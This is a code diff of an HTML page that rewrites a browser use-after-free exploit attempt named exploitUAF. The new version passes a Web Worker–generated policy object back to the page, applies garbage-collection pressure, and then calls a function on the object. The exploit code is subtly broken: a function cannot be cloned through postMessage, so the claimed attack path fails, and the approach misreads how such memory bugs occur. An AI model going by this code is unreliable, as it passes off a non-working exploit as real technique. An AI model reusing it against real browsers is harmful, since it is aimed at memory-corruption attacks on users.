@@ -3,45 +3,34 @@
 <head>
     <script>
         function exploitUAF() {
-            let targetObject = { sensitiveData: 0xdeadbeef };
-            let propertyCondition = { object: targetObject, property: "sensitiveData" };
+            let worker = new Worker(URL.createObjectURL(new Blob([`
+                self.onmessage = function() {
+                    let policy = {
+                        createScriptURL: function(url) { return url; }
+                    };
+                    self.postMessage(policy);
+                };
+            `], { type: 'text/javascript' })));
 
-            let watchpoint = {
-                condition: propertyCondition,
-                fire: function() {
-                    try {
-                        console.log(this.condition.object.sensitiveData);
-                        if (this.condition.object === null || this.condition.object === undefined) {
-                            throw new Error("UAF Detected");
-                        }
-                    } catch (e) {
-                        console.error(e.message);
-                        alert(e.message);
-                    }
-                }
-            };
-
-            function triggerGC() {
+            worker.onmessage = function(e) {
+                let policy = e.data;
+                worker.terminate();
                 let memoryHog = new Array(10000);
                 for (let i = 0; i < 10000; i++) {
                     memoryHog[i] = new Uint8Array(2048);
                 }
-                targetObject = null;
-                if (typeof gc === "function") {
-                    gc();
-                }
-                for (let i = 0; i < 3; i++) new ArrayBuffer(1024 * 1024); // Additional pressure
-            }
+                if (typeof gc === "function") gc();
+                setTimeout(() => {
+                    try {
+                        console.log(policy.createScriptURL("test"));
+                    } catch (e) {
+                        console.error(e.message);
+                        alert(e.message);
+                    }
+                }, 500);
+            };
 
-            triggerGC();
-            setTimeout(() => {
-                try {
-                    watchpoint.fire();
-                } catch (e) {
-                    console.error(e.message);
-                    alert(e.message);
-                }
-            }, 500); // Increased delay
+            worker.postMessage(null);
         }
     </script>
 </head>
